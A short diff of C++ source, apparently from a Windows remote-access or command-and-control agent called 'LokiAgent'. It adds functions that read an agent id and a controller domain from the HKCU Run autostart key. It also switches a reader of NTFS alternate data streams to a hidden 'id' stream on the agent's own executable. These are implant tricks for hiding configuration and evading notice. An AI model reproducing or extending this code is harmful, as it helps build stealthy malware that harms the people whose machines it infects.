@@ -34,9 +34,54 @@ public:
         return true;
     }
 
+
+    std::wstring readFromRegistry() {
+        HKEY hKey;
+        std::wstring valor;
+
+        // Abrir la clave del registro
+        if (RegOpenKeyEx(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+            DWORD bufferSize = 1024; // Tamaño del buffer para el valor del registro
+            wchar_t buffer[1024]; // Buffer para almacenar el valor del registro
+            DWORD valueType;
+
+            // Leer el valor del registro
+            if (RegQueryValueEx(hKey, L"id", NULL, &valueType, (LPBYTE)buffer, &bufferSize) == ERROR_SUCCESS) {
+                if (valueType == REG_SZ) { // Comprobar que el valor es de tipo REG_SZ (cadena)
+                    valor = buffer;
+                }
+            }
+
+            // Cerrar la clave del registro
+            RegCloseKey(hKey);
+        }
+
+        return valor;
+    }
+    
+    std::wstring readDomainFromRegistry() {
+        HKEY hKey;
+        std::wstring valor;
+
+        if (RegOpenKeyEx(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+            DWORD bufferSize = 1024; 
+            wchar_t buffer[1024];
+            DWORD valueType;
+
+            if (RegQueryValueEx(hKey, L"domain", NULL, &valueType, (LPBYTE)buffer, &bufferSize) == ERROR_SUCCESS) {
+                if (valueType == REG_SZ) { 
+                    valor = buffer;
+                }
+            }
+            RegCloseKey(hKey);
+        }
+        return valor;
+    }
+
+
     string readStringADS() {
-		const char* filename = "C:\\Users\\Public\\Music\\file.txt";
-		const char* streamname = "hiddenstream";
+		const char* filename = "LokiAgent.exe";
+		const char* streamname = "id";
 
 		char fullpath[1024];
 		sprintf(fullpath, "%s:%s", filename, streamname);
